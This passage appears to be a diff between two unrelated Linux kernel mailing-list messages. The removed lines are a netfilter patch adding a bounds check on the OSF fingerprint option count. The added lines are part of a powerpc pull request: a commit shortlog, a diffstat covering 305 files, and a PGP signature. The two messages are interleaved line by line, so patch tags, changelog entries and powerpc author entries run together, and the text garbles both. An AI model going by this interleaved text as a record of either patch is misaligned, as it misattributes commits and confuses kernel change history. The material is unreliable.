+      powerpc/pseries: Rework lppaca_shared_proc() to avoid DEBUG_PREEMPT
+      powerpc/iommu: Fix notifiers being shared by PCI and VIO buses
 
----
+Sourabh Jain (1):
+      powerpc/fadump: reset dump area size if fadump memory reserve fails
 
-Changelog:
-----------
+Trevor Woerner (1):
+      powerpc/configs: Drop CONFIG_IP_NF_TARGET_CLUSTERIP
 
-v1:
-* Initial patch
-v2:
-* Move the validation to nfnl_osf_add_callback()
+Uwe Kleine-K=C3=B6nig (1):
+      powerpc/ep8248e: Mark driver as non removable
 
-Fixes: f9324952088f ("netfilter: nfnetlink_osf: extract nfnetlink_subsystem code from xt_osf.c")
-Reported-by: Lucas Leong <wmliang@infosec.exchange>
-Cc: stable@kernel.org
-Signed-off-by: Wander Lairson Costa <wander@redhat.com>
----
- net/netfilter/nfnetlink_osf.c | 3 +++
- 1 file changed, 3 insertions(+)
+Vaibhav Jain (1):
+      powerpc/idle: Add support for nohlt
 
-diff --git a/net/netfilter/nfnetlink_osf.c b/net/netfilter/nfnetlink_osf.c
-index 8f1bfa6ccc2d..13fedf2aaa0f 100644
---- a/net/netfilter/nfnetlink_osf.c
-+++ b/net/netfilter/nfnetlink_osf.c
-@@ -315,6 +315,9 @@ static int nfnl_osf_add_callback(struct sk_buff *skb,
- 
- 	f = nla_data(osf_attrs[OSF_ATTR_FINGER]);
- 
-+	if (f->opt_num > ARRAY_SIZE(f->opt))
-+		return -EINVAL;
-+
- 	kf = kmalloc(sizeof(struct nf_osf_finger), GFP_KERNEL);
- 	if (!kf)
- 		return -ENOMEM;
--- 
-2.41.0
+Xiongfeng Wang (2):
+      cxl: Use pci_find_vsec_capability() to simplify the code
+      powerpc/powernv/pci: use pci_dev_id() to simplify the code
 
+Yuan Tan (1):
+      powerpc/pmac32: enable serial options by default in defconfig
+
+Zheng Zengkai (1):
+      ocxl: Use pci_dev_id() to simplify the code
+
+ruanjinjie (1):
+      powerpc/pseries: fix possible memory leak in ibmebus_bus_init()
+
+
+ Documentation/ABI/testing/sysfs-bus-event_source-devices-hv_gpci    | 160 =
+++++
+ Documentation/admin-guide/kernel-parameters.txt                     |   6 =
++-
+ Documentation/powerpc/ptrace.rst                                    |   8 =
++-
+ arch/powerpc/Kconfig                                                |  23 =
++-
+ arch/powerpc/Makefile                                               |   9 =
++-
+ arch/powerpc/boot/dts/fsl/c293si-post.dtsi                          |  12 =
++-
+ arch/powerpc/boot/dts/fsl/p1022rdk.dts                              |  10 =
++-
+ arch/powerpc/boot/dts/fsl/p1022si-post.dtsi                         |   2 =
++-
+ arch/powerpc/boot/dts/fsl/p3041ds.dts                               |   4 =
++-
+ arch/powerpc/boot/dts/fsl/p5040ds.dts                               |   2 =
++-
+ arch/powerpc/boot/dts/fsl/t4240qds.dts                              |   2 =
++-
+ arch/powerpc/boot/dts/mpc5121.dtsi                                  |   2 =
++-
+ arch/powerpc/boot/dts/mpc5125twr.dts                                |   2 =
++-
+ arch/powerpc/configs/pmac32_defconfig                               |   3 =
++-
+ arch/powerpc/configs/ppc64_defconfig                                |   3 +
+ arch/powerpc/configs/ppc6xx_defconfig                               |   1 -
+ arch/powerpc/configs/skiroot_defconfig                              |   1 -
+ arch/powerpc/crypto/Kconfig                                         |   2 =
++-
+ arch/powerpc/include/asm/8xx_immap.h                                |   2 +
+ arch/powerpc/include/asm/Kbuild                                     |   1 -
+ arch/powerpc/include/asm/book3s/32/kup.h                            | 123 =
+++-
+ arch/powerpc/include/asm/book3s/32/pgtable.h                        |  77 =
++-
+ arch/powerpc/include/asm/book3s/64/hash-pkey.h                      |   2 =
++-
+ arch/powerpc/include/asm/book3s/64/kup.h                            |  54 =
++-
+ arch/powerpc/include/asm/book3s/64/mmu.h                            |   7 =
++-
+ arch/powerpc/include/asm/bug.h                                      |   1 +
+ arch/powerpc/include/asm/cpm2.h                                     |   3 +
+ arch/powerpc/include/asm/cputable.h                                 |   2 =
++-
+ arch/powerpc/include/asm/dtl.h                                      |   1 -
+ arch/powerpc/include/asm/feature-fixups.h                           |   1 +
+ arch/powerpc/include/asm/fs_pd.h                                    |  22 -
+ arch/powerpc/include/asm/ftrace.h                                   |  24 =
++-
+ arch/powerpc/include/asm/hw_breakpoint.h                            |   1 +
+ arch/powerpc/include/asm/ibmebus.h                                  |   2 +
+ arch/powerpc/include/asm/iommu.h                                    |   3 +
+ arch/powerpc/include/asm/kfence.h                                   |   2 =
++-
+ arch/powerpc/include/asm/kup.h                                      |  91 =
++-
+ arch/powerpc/include/asm/lppaca.h                                   |  37 =
++-
+ arch/powerpc/include/asm/macio.h                                    |   3 =
++-
+ arch/powerpc/include/asm/mmu.h                                      |   9 =
++-
+ arch/powerpc/include/asm/mmu_context.h                              |   1 +
+ arch/powerpc/include/asm/module.h                                   |   4 -
+ arch/powerpc/include/asm/mpc8260.h                                  |  22 -
+ arch/powerpc/include/asm/nohash/32/kup-8xx.h                        |  62 =
++-
+ arch/powerpc/include/asm/nohash/32/pgtable.h                        |   2 =
++-
+ arch/powerpc/include/asm/nohash/64/pgtable.h                        |   2 =
++-
+ arch/powerpc/include/asm/nohash/kup-booke.h                         |  68 =
++-
+ arch/powerpc/include/asm/nohash/mmu-e500.h                          |   3 +
+ arch/powerpc/include/asm/paca.h                                     |   6 =
++-
+ arch/powerpc/include/asm/page.h                                     |  30 =
++-
+ arch/powerpc/include/asm/paravirt.h                                 |   1 +
+ arch/powerpc/include/asm/pci.h                                      |   3 =
++-
+ arch/powerpc/include/asm/pgtable.h                                  |   4 =
++-
+ arch/powerpc/include/asm/plpar_wrappers.h                           |   1 +
+ arch/powerpc/include/asm/ppc-opcode.h                               |   2 +
+ arch/powerpc/include/asm/processor.h                                |   5 -
+ arch/powerpc/include/asm/reg.h                                      |   2 -
+ arch/powerpc/include/asm/rtas.h                                     |   3 +
+ arch/powerpc/include/asm/sections.h                                 |   2 +
+ arch/powerpc/include/asm/setup.h                                    |   1 -
+ arch/powerpc/include/asm/topology.h                                 |  15 +
+ arch/powerpc/include/asm/uaccess.h                                  |   6 =
++-
+ arch/powerpc/include/asm/vermagic.h                                 |   4 =
++-
+ arch/powerpc/include/asm/vphn.h                                     |  24 +
+ arch/powerpc/kernel/audit.c                                         |   3 =
++-
+ arch/powerpc/kernel/audit_32.h                                      |   7 +
+ arch/powerpc/kernel/compat_audit.c                                  |   2 +
+ arch/powerpc/kernel/cputable.c                                      |   4 +
+ arch/powerpc/kernel/entry_32.S                                      |   1 -
+ arch/powerpc/kernel/epapr_hcalls.S                                  |   2 =
++-
+ arch/powerpc/kernel/fadump.c                                        |   1 +
+ arch/powerpc/kernel/fpu.S                                           |   2 =
++-
+ arch/powerpc/kernel/head_40x.S                                      |   1 -
+ arch/powerpc/kernel/head_44x.S                                      |   1 -
+ arch/powerpc/kernel/head_64.S                                       |   1 -
+ arch/powerpc/kernel/head_85xx.S                                     |   1 -
+ arch/powerpc/kernel/head_8xx.S                                      |   1 -
+ arch/powerpc/kernel/head_book3s_32.S                                |   1 -
+ arch/powerpc/kernel/hw_breakpoint.c                                 | 388 =
+++-------
+ arch/powerpc/kernel/iommu.c                                         |  17 =
++-
+ arch/powerpc/kernel/legacy_serial.c                                 |   2 =
++-
+ arch/powerpc/kernel/misc.S                                          |   2 =
++-
+ arch/powerpc/kernel/misc_32.S                                       |   2 =
++-
+ arch/powerpc/kernel/misc_64.S                                       |   2 =
++-
+ arch/powerpc/kernel/module_64.c                                     |   2 =
++-
+ arch/powerpc/kernel/of_platform.c                                   |   4 =
++-
+ arch/powerpc/kernel/pci-common.c                                    |   2 =
++-
+ arch/powerpc/kernel/pmc.c                                           |   2 =
++-
+ arch/powerpc/kernel/ptrace/ptrace-view.c                            | 105 =
+++-
+ arch/powerpc/kernel/rtas.c                                          |  45 =
++-
+ arch/powerpc/kernel/setup-common.c                                  |  10 =
++-
+ arch/powerpc/kernel/smp.c                                           |  20 =
++-
+ arch/powerpc/kernel/syscall.c                                       |   2 =
++-
+ arch/powerpc/kernel/tm.S                                            |   2 =
++-
+ arch/powerpc/kernel/trace/Makefile                                  |  12 =
++-
+ arch/powerpc/kernel/trace/ftrace.c                                  | 858 =
++++++--------------
+ arch/powerpc/kernel/trace/ftrace_64_pg.S                            |  67 =
+--
+ arch/powerpc/kernel/trace/ftrace_64_pg.c                            | 846 =
++++++++++++++++++++
+ arch/powerpc/kernel/trace/{ftrace_low.S =3D> ftrace_64_pg_entry.S}    |  6=
+6 +-
+ arch/powerpc/kernel/trace/{ftrace_mprofile.S =3D> ftrace_entry.S}     |  6=
+9 +-
+ arch/powerpc/kernel/traps.c                                         |  15 =
++-
+ arch/powerpc/kernel/ucall.S                                         |   2 =
++-
+ arch/powerpc/kernel/vector.S                                        |   2 =
++-
+ arch/powerpc/kernel/vmlinux.lds.S                                   |   4 -
+ arch/powerpc/kexec/crash.c                                          |   2 =
++-
+ arch/powerpc/kexec/file_load_64.c                                   |  13 =
++-
+ arch/powerpc/kexec/ranges.c                                         |   2 =
++-
+ arch/powerpc/kvm/book3s_64_entry.S                                  |   2 =
++-
+ arch/powerpc/kvm/book3s_64_mmu_hv.c                                 |   2 =
++-
+ arch/powerpc/kvm/book3s_hv_ras.c                                    |   1 +
+ arch/powerpc/kvm/book3s_hv_rmhandlers.S                             |   2 =
++-
+ arch/powerpc/kvm/e500mc.c                                           |   7 =
++-
+ arch/powerpc/kvm/tm.S                                               |   2 =
++-
+ arch/powerpc/lib/Makefile                                           |   2 =
++-
+ arch/powerpc/lib/alloc.c                                            |  23 -
+ arch/powerpc/lib/checksum_32.S                                      |   2 =
++-
+ arch/powerpc/lib/checksum_64.S                                      |   2 =
++-
+ arch/powerpc/lib/copy_32.S                                          |   2 =
++-
+ arch/powerpc/lib/copy_mc_64.S                                       |   2 =
++-
+ arch/powerpc/lib/copypage_64.S                                      |   2 =
++-
+ arch/powerpc/lib/copyuser_64.S                                      |   2 =
++-
+ arch/powerpc/lib/feature-fixups.c                                   |  31 =
++-
+ arch/powerpc/lib/hweight_64.S                                       |   2 =
++-
+ arch/powerpc/lib/mem_64.S                                           |   2 =
++-
+ arch/powerpc/lib/memcmp_32.S                                        |   2 =
++-
+ arch/powerpc/lib/memcmp_64.S                                        |   2 =
++-
+ arch/powerpc/lib/memcpy_64.S                                        |   2 =
++-
+ arch/powerpc/lib/sstep.c                                            |   4 =
++-
+ arch/powerpc/lib/string.S                                           |   2 =
++-
+ arch/powerpc/lib/string_32.S                                        |   2 =
++-
+ arch/powerpc/lib/string_64.S                                        |   2 =
++-
+ arch/powerpc/lib/strlen_32.S                                        |   2 =
++-
+ arch/powerpc/mm/book3s32/hash_low.S                                 |   2 =
++-
+ arch/powerpc/mm/book3s32/kuap.c                                     |  20 =
++-
+ arch/powerpc/mm/book3s32/mmu_context.c                              |   2 =
++-
+ arch/powerpc/mm/book3s64/pgtable.c                                  |   1 +
+ arch/powerpc/mm/book3s64/pkeys.c                                    |   2 =
++-
+ arch/powerpc/mm/book3s64/radix_pgtable.c                            |  65 =
++-
+ arch/powerpc/mm/book3s64/radix_tlb.c                                | 272 =
++++---
+ arch/powerpc/mm/book3s64/slb.c                                      |   1 +
+ arch/powerpc/mm/init_32.c                                           |   2 +
+ arch/powerpc/mm/init_64.c                                           | 127 =
++++
+ arch/powerpc/mm/mmu_context.c                                       |   8 =
++-
+ arch/powerpc/mm/mmu_decl.h                                          |   1 +
+ arch/powerpc/mm/nohash/kup.c                                        |   8 =
++-
+ arch/powerpc/mm/nohash/tlb.c                                        |  19 =
++-
+ arch/powerpc/mm/numa.c                                              |   1 +
+ arch/powerpc/perf/core-fsl-emb.c                                    |   8 =
++-
+ arch/powerpc/perf/hv-gpci.c                                         | 637 =
++++++++++++++-
+ arch/powerpc/platforms/44x/warp.c                                   |  55 =
+--
+ arch/powerpc/platforms/4xx/cpm.c                                    |   2 =
++-
+ arch/powerpc/platforms/4xx/hsta_msi.c                               |   2 =
++-
+ arch/powerpc/platforms/4xx/soc.c                                    |   3 =
++-
+ arch/powerpc/platforms/4xx/uic.c                                    |   1 +
+ arch/powerpc/platforms/512x/mpc5121_ads.c                           |   2 =
++-
+ arch/powerpc/platforms/512x/mpc512x.h                               |   1 -
+ arch/powerpc/platforms/512x/mpc512x_generic.c                       |   2 =
++-
+ arch/powerpc/platforms/512x/mpc512x_lpbfifo.c                       |   2 =
++-
+ arch/powerpc/platforms/512x/mpc512x_shared.c                        |  30 =
++-
+ arch/powerpc/platforms/512x/pdm360ng.c                              |   3 =
++-
+ arch/powerpc/platforms/52xx/mpc52xx_gpt.c                           |   3 =
++-
+ arch/powerpc/platforms/82xx/Kconfig                                 |  24 =
++-
+ arch/powerpc/platforms/82xx/ep8248e.c                               |  10 =
++-
+ arch/powerpc/platforms/82xx/km82xx.c                                |   1 -
+ arch/powerpc/platforms/82xx/m82xx_pci.h                             |  14 -
+ arch/powerpc/platforms/82xx/pq2.c                                   |  46 -
+ arch/powerpc/platforms/83xx/Makefile                                |   5 =
++-
+ arch/powerpc/platforms/83xx/km83xx.c                                |   4 =
++-
+ arch/powerpc/platforms/83xx/mpc832x_rdb.c                           |   4 =
++-
+ arch/powerpc/platforms/83xx/mpc83xx.h                               |   2 -
+ arch/powerpc/platforms/83xx/suspend.c                               |   2 =
++-
+ arch/powerpc/platforms/83xx/usb.c                                   | 251 =
+------
+ arch/powerpc/platforms/83xx/usb_831x.c                              | 128 =
++++
+ arch/powerpc/platforms/83xx/usb_834x.c                              |  90 =
+++
+ arch/powerpc/platforms/83xx/usb_837x.c                              |  58 =
+++
+ arch/powerpc/platforms/85xx/bsc913x_qds.c                           |   2 =
++-
+ arch/powerpc/platforms/85xx/bsc913x_rdb.c                           |   2 =
++-
+ arch/powerpc/platforms/85xx/c293pcie.c                              |   3 =
++-
+ arch/powerpc/platforms/85xx/common.c                                |   1 +
+ arch/powerpc/platforms/85xx/corenet_generic.c                       |   6 =
++-
+ arch/powerpc/platforms/85xx/ge_imp3a.c                              |   2 =
++-
+ arch/powerpc/platforms/85xx/ksi8560.c                               |   3 =
++-
+ arch/powerpc/platforms/85xx/mpc8536_ds.c                            |   2 =
++-
+ arch/powerpc/platforms/85xx/mpc85xx_ds.c                            |   2 =
++-
+ arch/powerpc/platforms/85xx/mpc85xx_mds.c                           |   4 =
++-
+ arch/powerpc/platforms/85xx/mpc85xx_rdb.c                           |   3 =
++-
+ arch/powerpc/platforms/85xx/p1010rdb.c                              |   2 =
++-
+ arch/powerpc/platforms/85xx/p1022_ds.c                              |   2 =
++-
+ arch/powerpc/platforms/85xx/p1022_rdk.c                             |   2 =
++-
+ arch/powerpc/platforms/85xx/p1023_rdb.c                             |   3 =
++-
+ arch/powerpc/platforms/85xx/qemu_e500.c                             |   2 =
++-
+ arch/powerpc/platforms/85xx/socrates.c                              |   2 =
++-
+ arch/powerpc/platforms/85xx/socrates_fpga_pic.c                     |   1 -
+ arch/powerpc/platforms/85xx/stx_gp3.c                               |   2 =
++-
+ arch/powerpc/platforms/85xx/tqm85xx.c                               |   2 =
++-
+ arch/powerpc/platforms/85xx/twr_p102x.c                             |   3 =
++-
+ arch/powerpc/platforms/85xx/xes_mpc85xx.c                           |   2 =
++-
+ arch/powerpc/platforms/86xx/common.c                                |   3 +
+ arch/powerpc/platforms/86xx/gef_ppc9a.c                             |   2 =
++-
+ arch/powerpc/platforms/86xx/gef_sbc310.c                            |   2 =
++-
+ arch/powerpc/platforms/86xx/gef_sbc610.c                            |   2 =
++-
+ arch/powerpc/platforms/86xx/mvme7100.c                              |   1 -
+ arch/powerpc/platforms/86xx/pic.c                                   |   4 =
++-
+ arch/powerpc/platforms/8xx/adder875.c                               |   2 =
++-
+ arch/powerpc/platforms/8xx/cpm1.c                                   |  10 =
++-
+ arch/powerpc/platforms/8xx/m8xx_setup.c                             |  79 =
++-
+ arch/powerpc/platforms/8xx/mpc86xads_setup.c                        |   1 -
+ arch/powerpc/platforms/8xx/mpc885ads_setup.c                        |   1 -
+ arch/powerpc/platforms/8xx/tqm8xx_setup.c                           |   1 -
+ arch/powerpc/platforms/Kconfig                                      |   2 =
++-
+ arch/powerpc/platforms/Kconfig.cputype                              |   7 +
+ arch/powerpc/platforms/cell/axon_msi.c                              |   3 =
++-
+ arch/powerpc/platforms/cell/cbe_regs.c                              |   3 =
++-
+ arch/powerpc/platforms/cell/iommu.c                                 |   2 =
++-
+ arch/powerpc/platforms/cell/ras.c                                   |   2 =
++-
+ arch/powerpc/platforms/cell/setup.c                                 |   1 +
+ arch/powerpc/platforms/cell/spider-pci.c                            |   1 -
+ arch/powerpc/platforms/cell/spu_manage.c                            |   1 +
+ arch/powerpc/platforms/embedded6xx/holly.c                          |   2 =
++-
+ arch/powerpc/platforms/maple/setup.c                                |   3 =
++-
+ arch/powerpc/platforms/pasemi/gpio_mdio.c                           |   2 =
++-
+ arch/powerpc/platforms/pasemi/pasemi.h                              |   1 +
+ arch/powerpc/platforms/pasemi/setup.c                               |   2 +
+ arch/powerpc/platforms/pasemi/time.c                                |   2 +
+ arch/powerpc/platforms/powermac/feature.c                           |  10 =
++-
+ arch/powerpc/platforms/powermac/setup.c                             |   2 =
++-
+ arch/powerpc/platforms/powernv/eeh-powernv.c                        |   3 =
++-
+ arch/powerpc/platforms/powernv/ocxl.c                               |   2 =
++-
+ arch/powerpc/platforms/powernv/opal-imc.c                           |   1 -
+ arch/powerpc/platforms/powernv/opal-prd.c                           |  27 =
++-
+ arch/powerpc/platforms/powernv/opal-rtc.c                           |   3 =
++-
+ arch/powerpc/platforms/powernv/opal-secvar.c                        |   2 =
++-
+ arch/powerpc/platforms/powernv/opal-sensor.c                        |   2 +
+ arch/powerpc/platforms/powernv/opal-xscom.c                         |   4 =
++-
+ arch/powerpc/platforms/powernv/pci-ioda.c                           |   6 =
++-
+ arch/powerpc/platforms/powernv/setup.c                              |  10 =
++-
+ arch/powerpc/platforms/ps3/repository.c                             |   4 =
++-
+ arch/powerpc/platforms/pseries/hotplug-cpu.c                        |  30 =
++-
+ arch/powerpc/platforms/pseries/hotplug-memory.c                     |  60 =
++-
+ arch/powerpc/platforms/pseries/hvCall.S                             |   2 =
++-
+ arch/powerpc/platforms/pseries/ibmebus.c                            |   2 +
+ arch/powerpc/platforms/pseries/iommu.c                              |   2 -
+ arch/powerpc/platforms/pseries/lpar.c                               |  11 =
++-
+ arch/powerpc/platforms/pseries/lparcfg.c                            |   4 =
++-
+ arch/powerpc/platforms/pseries/plpks.c                              |   2 =
++-
+ arch/powerpc/platforms/pseries/pseries.h                            |   4 =
++-
+ arch/powerpc/platforms/pseries/setup.c                              |  11 =
++-
+ arch/powerpc/platforms/pseries/vas.c                                |   1 +
+ arch/powerpc/platforms/pseries/vphn.c                               |   2 =
++-
+ arch/powerpc/sysdev/cpm2.c                                          |  33 =
++-
+ arch/powerpc/sysdev/cpm2_pic.c                                      |   4 =
++-
+ arch/powerpc/sysdev/cpm_common.c                                    |   2 -
+ arch/powerpc/sysdev/cpm_gpio.c                                      |   3 =
++-
+ arch/powerpc/sysdev/dcr-low.S                                       |   2 =
++-
+ arch/powerpc/sysdev/ehv_pic.c                                       |  12 =
++-
+ arch/powerpc/sysdev/fsl_pci.c                                       |   4 =
++-
+ arch/powerpc/sysdev/fsl_pci.h                                       |   1 -
+ arch/powerpc/sysdev/fsl_pmc.c                                       |   4 =
++-
+ arch/powerpc/sysdev/fsl_rio.c                                       |  13 =
++-
+ arch/powerpc/sysdev/fsl_rmu.c                                       |   3 =
++-
+ arch/powerpc/sysdev/fsl_soc.c                                       |   1 -
+ arch/powerpc/sysdev/mpc5xxx_clocks.c                                |   4 =
++-
+ arch/powerpc/sysdev/mpic_msgr.c                                     |   3 =
++-
+ arch/powerpc/sysdev/mpic_timer.c                                    |   1 -
+ arch/powerpc/sysdev/of_rtc.c                                        |   4 =
++-
+ arch/powerpc/sysdev/pmi.c                                           |   4 =
++-
+ arch/powerpc/sysdev/xics/ics-opal.c                                 |   1 -
+ arch/powerpc/tools/gcc-check-fpatchable-function-entry.sh           |  26 +
+ arch/powerpc/xmon/Makefile                                          |  10 =
++-
+ arch/powerpc/xmon/xmon.c                                            |  11 =
++-
+ drivers/cpuidle/cpuidle-pseries.c                                   |   8 =
++-
+ drivers/macintosh/ams/ams-core.c                                    |   2 =
++-
+ drivers/macintosh/ams/ams.h                                         |   1 +
+ drivers/misc/cxl/native.c                                           |   5 -
+ drivers/misc/cxl/pci.c                                              |  11 =
++-
+ drivers/net/ethernet/freescale/fs_enet/fs_enet.h                    |   2 -
+ drivers/net/ethernet/freescale/fs_enet/mac-fcc.c                    |   1 -
+ drivers/pci/hotplug/rpaphp_pci.c                                    |  85 =
++-
+ include/linux/hw_breakpoint.h                                       |   3 -
+ kernel/events/hw_breakpoint.c                                       |  28 -
+ tools/testing/selftests/powerpc/copyloops/{asm =3D> linux}/export.h   |   0
+ tools/testing/selftests/powerpc/harness.c                           |   4 =
++-
+ tools/testing/selftests/powerpc/include/subunit.h                   |  16 =
++-
+ tools/testing/selftests/powerpc/include/utils.h                     |   2 =
++-
+ tools/testing/selftests/powerpc/mm/.gitignore                       |  17 =
++-
+ tools/testing/selftests/powerpc/ptrace/Makefile                     |   1 +
+ tools/testing/selftests/powerpc/ptrace/child.h                      |   4 =
++-
+ tools/testing/selftests/powerpc/ptrace/core-pkey.c                  |   2 =
++-
+ tools/testing/selftests/powerpc/ptrace/perf-hwbreak.c               |   2 =
++-
+ tools/testing/selftests/powerpc/ptrace/ptrace-hwbreak.c             |  26 =
++-
+ tools/testing/selftests/powerpc/ptrace/ptrace-perf-asm.S            |  33 +
+ tools/testing/selftests/powerpc/ptrace/ptrace-perf-hwbreak.c        | 882 =
+++++++++------------
+ tools/testing/selftests/powerpc/ptrace/ptrace-pkey.c                |   2 =
++-
+ tools/testing/selftests/powerpc/ptrace/ptrace-tar.c                 |   2 =
++-
+ tools/testing/selftests/powerpc/ptrace/ptrace-tm-gpr.c              |   4 =
++-
+ tools/testing/selftests/powerpc/ptrace/ptrace-tm-spd-gpr.c          |   4 =
++-
+ tools/testing/selftests/powerpc/ptrace/ptrace-tm-spd-tar.c          |   4 =
++-
+ tools/testing/selftests/powerpc/ptrace/ptrace-tm-spd-vsx.c          |   4 =
++-
+ tools/testing/selftests/powerpc/ptrace/ptrace-tm-spr.c              |   4 =
++-
+ tools/testing/selftests/powerpc/ptrace/ptrace-tm-tar.c              |   4 =
++-
+ tools/testing/selftests/powerpc/ptrace/ptrace-tm-vsx.c              |   4 =
++-
+ tools/testing/selftests/powerpc/ptrace/ptrace-vsx.c                 |   2 =
++-
+ tools/testing/selftests/powerpc/stringloops/{asm =3D> linux}/export.h |   0
+ tools/testing/selftests/powerpc/vphn/asm/lppaca.h                   |   1 -
+ tools/testing/selftests/powerpc/vphn/asm/vphn.h                     |   1 +
+ 305 files changed, 4042 insertions(+), 3290 deletions(-)
+ delete mode 100644 arch/powerpc/include/asm/mpc8260.h
+ create mode 100644 arch/powerpc/include/asm/vphn.h
+ create mode 100644 arch/powerpc/kernel/audit_32.h
+ delete mode 100644 arch/powerpc/kernel/trace/ftrace_64_pg.S
+ create mode 100644 arch/powerpc/kernel/trace/ftrace_64_pg.c
+ rename arch/powerpc/kernel/trace/{ftrace_low.S =3D> ftrace_64_pg_entry.S} =
+(53%)
+ rename arch/powerpc/kernel/trace/{ftrace_mprofile.S =3D> ftrace_entry.S} (=
+83%)
+ delete mode 100644 arch/powerpc/lib/alloc.c
+ delete mode 100644 arch/powerpc/platforms/82xx/m82xx_pci.h
+ delete mode 100644 arch/powerpc/platforms/83xx/usb.c
+ create mode 100644 arch/powerpc/platforms/83xx/usb_831x.c
+ create mode 100644 arch/powerpc/platforms/83xx/usb_834x.c
+ create mode 100644 arch/powerpc/platforms/83xx/usb_837x.c
+ create mode 100755 arch/powerpc/tools/gcc-check-fpatchable-function-entry.=
+sh
+ rename tools/testing/selftests/powerpc/copyloops/{asm =3D> linux}/export.h=
+ (100%)
+ create mode 100644 tools/testing/selftests/powerpc/ptrace/ptrace-perf-asm.S
+ rename tools/testing/selftests/powerpc/stringloops/{asm =3D> linux}/export=
+.h (100%)
+ delete mode 120000 tools/testing/selftests/powerpc/vphn/asm/lppaca.h
+ create mode 120000 tools/testing/selftests/powerpc/vphn/asm/vphn.h
+-----BEGIN PGP SIGNATURE-----
+
+iQIzBAEBCAAdFiEEJFGtCPCthwEv2Y/bUevqPMjhpYAFAmTwihMACgkQUevqPMjh
+pYAUxQ/+ID2GW2f+wbhHfnNRnWQw/LbGp0JQ5DmX3HDZy9/uEY+x24T01w5BaOWg
+qRCMKI/HPHASqfPUlj1wlwnUQJbhxiki6eYCovfCNZkX3pn3hsn6RPmEe3YVzZUh
+kot+qFXiRlAzEINMfsjmCGobwMyByfTax2vCDLwzXEvx3dSSXkDfPJ3IyPSxXPAM
+dKIfQ3Qj5jlSfd99lsTXWAwLeWCvQZS4qADf1RaSbuoCVNTJ/Wn5vRWJSnFqh9Aj
+3CdqzdNwnoxc6VZTWusx5XQmUEFnaZmKfup3ImGydhcgDB9OYaJjV7zMgr7rDM5f
+hR3N2hO5vSB2p/vk/7OV9nsD8kf3+Rlvx+FEelp25WoX9JcaMSkZJiIg4f5oS/sk
+Id7r+sFeOjq3fjt2IdlFF7mA5IrhzyTiZdTFtZQ1jPOZcuF/myQdqS27bLBr9Cpu
+ljmkCLMEZCqCOD6op0yYS4nHBvMqvxtI702ZzhjsJ5W0+/ZpE97pRWvoYMEr285T
+OS183ERai2sIWKlDeM+6mdkviXR3kqzFR+0O9GWI+0MRHFjZBNwODlOVKKt3OnpV
+LYfeYCcMrAXkxPr8/dIy0qs7Nxyh4wtQfGqPIitzHButZA9F1gJOSAPZhMs4Ho6E
+V88HgA2hg85zSM8g8NsFz6Qj+sDDpwF8E6fPnqwiB0fJDMgaaUc=3D
+=3DqSfV
+-----END PGP SIGNATURE-----
